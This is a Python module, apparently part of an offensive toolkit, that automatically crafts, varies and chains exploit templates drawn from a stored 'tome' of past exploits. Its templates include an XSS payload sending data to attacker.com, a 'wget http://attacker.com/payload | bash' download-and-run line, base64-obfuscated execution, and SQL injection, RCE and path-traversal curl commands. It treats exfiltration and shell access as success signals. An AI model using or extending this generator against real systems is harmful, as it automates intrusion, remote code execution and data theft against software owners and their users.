"""
AI Exploit Crafter - Uses tome data to craft new exploits
Combines information from multiple sources to generate novel exploits
"""

import json
import re
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
import logging

from tome_ai_integration import TomeAIBridge, ExploitTemplate, TomeAccessor

logger = logging.getLogger(__name__)


@dataclass
class ExploitIdea:
    """Initial idea for an exploit"""
    category: str
    target_type: str
    vulnerability_description: str
    cve_ids: List[str]
    references: List[str]
    confidence_score: float


class AIExploitCrafter:
    """
    AI system for crafting new exploits based on tome knowledge
    and external information sources
    """
    
    def __init__(self, tome_bridge: TomeAIBridge):
        self.bridge = tome_bridge
        self.accessor = TomeAccessor(tome_bridge)
        self.crafted_exploits = []
    
    # ========== MAIN CRAFTING INTERFACE ==========
    
    def craft_exploit_from_idea(self, idea: ExploitIdea) -> Optional[ExploitTemplate]:
        """
        Craft an exploit from an idea
        Combines similar exploits, adapts payloads, and generates new ones
        """
        try:
            # Step 1: Find similar exploits in tome
            similar_exploits = self.accessor.get_similar_exploits(idea.category)
            
            # Step 2: Analyze their patterns
            payload_patterns = self._extract_payload_patterns(similar_exploits)
            
            # Step 3: Generate new payload based on patterns
            new_payload = self._generate_payload(
                idea.vulnerability_description,
                payload_patterns,
                idea.target_type
            )
            
            # Step 4: Extract prerequisites and success indicators
            prerequisites = self._extract_prerequisites(similar_exploits)
            success_indicators = self._extract_success_indicators(similar_exploits)
            
            # Step 5: Generate tags
            tags = self._generate_tags(idea.category, idea.target_type, idea.cve_ids)
            
            # Step 6: Determine difficulty
            difficulty = self._assess_difficulty(new_payload, idea.cve_ids)
            
            # Create template
            exploit_template = ExploitTemplate(
                name=self._generate_exploit_name(idea.category, idea.target_type),
                category=idea.category,
                target_type=idea.target_type,
                vulnerability_type=idea.vulnerability_description,
                cve_ids=idea.cve_ids,
                payload_template=new_payload,
                prerequisites=prerequisites,
                success_indicators=success_indicators,
                references=idea.references,
                tags=tags,
                difficulty=difficulty
            )
            
            self.crafted_exploits.append(exploit_template)
            logger.info(f"Crafted exploit: {exploit_template.name}")
            
            return exploit_template
        except Exception as e:
            logger.error(f"Failed to craft exploit: {e}")
            return None
    
    def craft_exploit_from_cve(self, cve_id: str) -> Optional[ExploitTemplate]:
        """
        Craft an exploit for a specific CVE
        Searches tome for existing exploits and creates variants
        """
        try:
            # Get existing exploits for this CVE
            existing = self.accessor.get_cve_exploits(cve_id)
            
            if existing:
                # If we have working exploits, create a variant
                return self._create_exploit_variant(existing[0], cve_id)
            else:
                # Create a new exploit from scratch
                # (In real scenario, would need CVE database integration)
                return None
        except Exception as e:
            logger.error(f"Failed to craft exploit from CVE: {e}")
            return None
    
    def craft_exploit_from_target_info(self, target_info: Dict) -> List[ExploitTemplate]:
        """
        Craft exploits based on target information
        Analyzes target and generates multiple exploit options
        """
        try:
            templates = []
            
            # Get recommendations from tome
            recommendations = self.bridge.get_exploit_recommendations_for_target(target_info)
            
            # For each recommendation, create a variant or adaptation
            for recommendation in recommendations[:5]:  # Top 5
                variant = self._create_exploit_variant(recommendation)
                if variant:
                    templates.append(variant)
            
            return templates
        except Exception as e:
            logger.error(f"Failed to craft exploits from target: {e}")
            return []
    
    def craft_exploit_chain(self, vulnerability_chain: List[Dict]) -> Optional[ExploitTemplate]:
        """
        Create an exploit that chains multiple vulnerabilities
        Useful for multi-stage attacks
        """
        try:
            # Extract info from all vulnerabilities
            all_cves = []
            all_categories = []
            payloads = []
            
            for vuln in vulnerability_chain:
                all_cves.extend(vuln.get('cve_ids', []))
                all_categories.append(vuln.get('category', ''))
                
                # Get exploit patterns for this vulnerability
                if vuln.get('cve_ids'):
                    for cve in vuln.get('cve_ids'):
                        exploits = self.accessor.get_cve_exploits(cve)
                        if exploits:
                            payloads.append(exploits[0]['payload'])
            
            # Combine payloads into a chain
            chained_payload = self._chain_payloads(payloads)
            
            # Generate chain template
            chain_template = ExploitTemplate(
                name=f"Multi-Stage Chain: {' -> '.join(all_categories[:3])}",
                category="Exploit Chain",
                target_type="Multi-Stage",
                vulnerability_type="Chained Vulnerabilities",
                cve_ids=list(set(all_cves)),
                payload_template=chained_payload,
                prerequisites=["Stage 1 execution required", "Persistence between stages"],
                success_indicators=[
                    "Each stage completes successfully",
                    "Final payload execution confirmed"
                ],
                references=[],
                tags=["chain", "multi-stage"] + all_categories,
                difficulty="expert"
            )
            
            return chain_template
        except Exception as e:
            logger.error(f"Failed to craft exploit chain: {e}")
            return None
    
    # ========== PAYLOAD GENERATION ==========
    
    def _extract_payload_patterns(self, exploits: List[Dict]) -> List[Dict]:
        """Extract common patterns from successful payloads"""
        try:
            patterns = []
            
            for exploit in exploits:
                payload = exploit.get('payload', '')
                
                # Extract basic patterns
                pattern = {
                    'raw': payload,
                    'language': self._detect_payload_language(payload),
                    'techniques': self._extract_techniques(payload),
                    'success_rate': exploit['success_count'] / max(1, exploit['success_count'] + exploit['fail_count'])
                }
                patterns.append(pattern)
            
            return patterns
        except Exception as e:
            logger.error(f"Failed to extract patterns: {e}")
            return []
    
    def _generate_payload(self, vulnerability: str, patterns: List[Dict], 
                         target_type: str) -> str:
        """Generate a new payload based on patterns"""
        try:
            if not patterns:
                # Generate basic payload template
                return self._generate_basic_payload(vulnerability, target_type)
            
            # Analyze successful patterns
            best_pattern = max(patterns, key=lambda x: x['success_rate'])
            
            # Create variation
            base_payload = best_pattern['raw']
            language = best_pattern['language']
            techniques = best_pattern['techniques']
            
            # Generate payload variation
            if language == 'bash':
                return self._generate_bash_payload(vulnerability, target_type, base_payload)
            elif language == 'python':
                return self._generate_python_payload(vulnerability, target_type, base_payload)
            elif language == 'curl':
                return self._generate_curl_payload(vulnerability, target_type, base_payload)
            elif language == 'javascript':
                return self._generate_javascript_payload(vulnerability, target_type, base_payload)
            else:
                return base_payload + f"\n# Extended for {vulnerability}"
        except Exception as e:
            logger.error(f"Failed to generate payload: {e}")
            return "# Payload generation failed"
    
    def _generate_basic_payload(self, vulnerability: str, target_type: str) -> str:
        """Generate a basic payload template"""
        templates = {
            'SQL Injection': """# SQL Injection Payload
# Modify the input to include SQL commands
# Example: ' OR '1'='1
# Target parameter: {parameter}
curl -X POST {target} -d "param=' OR '1'='1"
""",
            'XSS': """# Cross-Site Scripting Payload
<script>
  // Payload code here
  var data = {payload};
  // Send to attacker server
  fetch('http://attacker.com/log?data=' + btoa(JSON.stringify(data)));
</script>
""",
            'RCE': """#!/bin/bash
# Remote Code Execution
# This payload achieves command execution on the target
command="id"
# Send command to vulnerable endpoint
curl -X POST {target} -d "cmd=${command}"
""",
            'LFI': """# Local File Inclusion
# Traverse directory structure to read files
payload="../../../etc/passwd"
curl "http://{target}/page.php?file=${payload}"
"""
        }
        
        for key in templates:
            if key.lower() in vulnerability.lower():
                return templates[key]
        
        return f"""# Exploit for {vulnerability} against {target_type}
# Generated payload template
# TODO: Customize for specific target
"""
    
    def _generate_bash_payload(self, vulnerability: str, target_type: str, 
                              base_payload: str) -> str:
        """Generate bash-based payload variant"""
        variations = [
            base_payload,
            base_payload + "\n# Obfuscation layer\nenc=$(echo 'command' | base64)\necho $enc | base64 -d | bash",
            base_payload + "\n# Alternative delivery method\nwget http://attacker.com/payload -O - | bash"
        ]
        return variations[0]
    
    def _generate_python_payload(self, vulnerability: str, target_type: str,
                                base_payload: str) -> str:
        """Generate Python-based payload variant"""
        template = f"""import requests
import json

# {vulnerability} - Python Payload
target = "{{{{TARGET_URL}}}}"

# Payload construction
payload = {{{{{
    'vulnerable_param': '{{{{PAYLOAD}}}}'
}}}}}

try:
    response = requests.post(target, data=payload, timeout=5)
    print(f"Response: {{response.status_code}}")
    if response.status_code == 200:
        print("Exploit successful!")
        # Parse response
        print(response.text)
except Exception as e:
    print(f"Error: {{e}}")
"""
        return template
    
    def _generate_curl_payload(self, vulnerability: str, target_type: str,
                              base_payload: str) -> str:
        """Generate curl-based payload variant"""
        template = f"""# {vulnerability} - cURL Exploit
# Usage: bash exploit.sh <target_url>

TARGET="${{1}}"
PAYLOAD="{{{{PAYLOAD}}}}"

# Send exploit
curl -X POST "$TARGET" \\
  -H "Content-Type: application/json" \\
  -d "$PAYLOAD" \\
  -v

echo "Exploit sent to: $TARGET"
"""
        return template
    
    def _generate_javascript_payload(self, vulnerability: str, target_type: str,
                                    base_payload: str) -> str:
        """Generate JavaScript-based payload variant"""
        template = f"""// {vulnerability} - JavaScript Payload
// Inject this into the target application

(function() {{
  const target = '{{{{TARGET_URL}}}}';
  const payload = '{{{{PAYLOAD}}}}';
  
  // Execute exploit
  async function exploit() {{
    try {{
      const response = await fetch(target, {{
        method: 'POST',
        body: JSON.stringify({{
          exploit: payload
        }})
      }});
      
      if (response.ok) {{
        console.log('Exploit successful!');
      }}
    }} catch(e) {{
      console.error('Error:', e);
    }}
  }}
  
  exploit();
}})();
"""
        return template
    
    def _detect_payload_language(self, payload: str) -> str:
        """Detect the language/type of payload"""
        if 'curl' in payload.lower():
            return 'curl'
        elif payload.strip().startswith('#!/bin/bash'):
            return 'bash'
        elif 'import ' in payload and ('requests' in payload or 'socket' in payload):
            return 'python'
        elif payload.strip().startswith('//') or 'function' in payload:
            return 'javascript'
        elif 'SELECT' in payload.upper() or 'INSERT' in payload.upper():
            return 'sql'
        else:
            return 'unknown'
    
    def _extract_techniques(self, payload: str) -> List[str]:
        """Extract attack techniques from payload"""
        techniques = []
        
        if 'base64' in payload.lower():
            techniques.append('encoding')
        if 'obfuscation' in payload.lower() or 'encrypt' in payload.lower():
            techniques.append('obfuscation')
        if 'reverse' in payload.lower() or 'shell' in payload.lower():
            techniques.append('reverse_shell')
        if 'wget' in payload or 'curl' in payload:
            techniques.append('download')
        if 'chmod' in payload or 'sudo' in payload:
            techniques.append('privilege_escalation')
        
        return techniques
    
    # ========== EXPLOIT TEMPLATE GENERATION ==========
    
    def _extract_prerequisites(self, exploits: List[Dict]) -> List[str]:
        """Extract common prerequisites"""
        prerequisites = set()
        
        for exploit in exploits:
            notes = exploit.get('notes', '')
            # Parse notes for prerequisites
            if 'require' in notes.lower():
                lines = notes.split('\n')
                for line in lines:
                    if 'require' in line.lower():
                        prerequisites.add(line.strip())
        
        return list(prerequisites) if prerequisites else [
            "Target must be reachable",
            "Appropriate permissions required"
        ]
    
    def _extract_success_indicators(self, exploits: List[Dict]) -> List[str]:
        """Extract success indicators"""
        indicators = {
            "HTTP 200 response",
            "Target command executed",
            "Data exfiltration confirmed",
            "Callback received",
            "Shell access achieved"
        }
        return list(indicators)
    
    def _generate_tags(self, category: str, target_type: str, cve_ids: List[str]) -> List[str]:
        """Generate appropriate tags"""
        tags = [category.lower().replace(' ', '-')]
        tags.append(target_type.lower().replace(' ', '-'))
        tags.extend([f"cve-{cve.lower()}" for cve in cve_ids])
        return tags
    
    def _assess_difficulty(self, payload: str, cve_ids: List[str]) -> str:
        """Assess exploit difficulty"""
        complexity = 0
        
        # Payload length
        complexity += len(payload) // 100
        
        # Number of CVEs (more = more complex)
        complexity += len(cve_ids)
        
        # Techniques used
        techniques = self._extract_techniques(payload)
        complexity += len(techniques)
        
        if complexity < 3:
            return "easy"
        elif complexity < 6:
            return "medium"
        elif complexity < 10:
            return "hard"
        else:
            return "expert"
    
    def _generate_exploit_name(self, category: str, target_type: str) -> str:
        """Generate an exploit name"""
        return f"{category} Exploit ({target_type}) - {datetime.now().strftime('%Y%m%d')}"
    
    # ========== EXPLOIT ADAPTATION ==========
    
    def _create_exploit_variant(self, base_exploit: Dict, 
                               cve_id: str = None) -> Optional[ExploitTemplate]:
        """Create a variant of an existing exploit"""
        try:
            # Modify payload slightly for variation
            modified_payload = base_exploit['payload']
            
            # Add obfuscation if not present
            if 'base64' not in modified_payload.lower():
                modified_payload += "\n# Obfuscated variant available"
            
            return ExploitTemplate(
                name=f"{base_exploit['name']} (Variant)",
                category=base_exploit['category'],
                target_type=base_exploit['target'],
                vulnerability_type=f"{base_exploit.get('notes', '')}",
                cve_ids=json.loads(base_exploit['cve_ids']),
                payload_template=modified_payload,
                prerequisites=["Base exploit knowledge required"],
                success_indicators=["Execution confirmation"],
                references=json.loads(base_exploit['reference_links']),
                tags=json.loads(base_exploit['tags']),
                difficulty="medium"
            )
        except Exception as e:
            logger.error(f"Failed to create variant: {e}")
            return None
    
    def _chain_payloads(self, payloads: List[str]) -> str:
        """Chain multiple payloads together"""
        if not payloads:
            return ""
        
        chain = """#!/bin/bash
# Chained Exploit Execution
# Executes multiple payloads in sequence

set -e  # Exit on error

echo "[*] Starting exploit chain..."

"""
        
        for i, payload in enumerate(payloads, 1):
            chain += f"\necho \"[+] Stage {i}: Executing...\"\n"
            chain += payload.strip() + "\n"
            chain += f"echo \"[+] Stage {i}: Complete\"\n"
        
        chain += "\necho \"[+] Exploit chain completed!\"\n"
        
        return chain
    
    def save_crafted_exploit(self, template: ExploitTemplate) -> bool:
        """Save crafted exploit to tome"""
        try:
            result = self.bridge.create_exploit_from_ai(template)
            return result.get('success', False)
        except Exception as e:
            logger.error(f"Failed to save exploit: {e}")
            return False
    
    def get_crafting_suggestions(self) -> List[str]:
        """Get suggestions for what exploits to craft next"""
        try:
            analysis = self.bridge.analyze_exploit_patterns()
            
            suggestions = []
            
            # Look for categories with few exploits
            kb = self.bridge.get_exploit_knowledge_base()
            categories = kb.get('exploits_by_category', {})
            
            for category, exploits in categories.items():
                if len(exploits) < 3:
                    suggestions.append(f"Create more {category} exploits (only {len(exploits)} exist)")
            
            return suggestions[:5]
        except Exception as e:
            logger.error(f"Failed to get suggestions: {e}")
            return []


def create_exploit_crafter(tome_bridge: TomeAIBridge = None) -> AIExploitCrafter:
    """Factory function to create the exploit crafter"""
    if not tome_bridge:
        tome_bridge = TomeAIBridge()
    return AIExploitCrafter(tome_bridge)
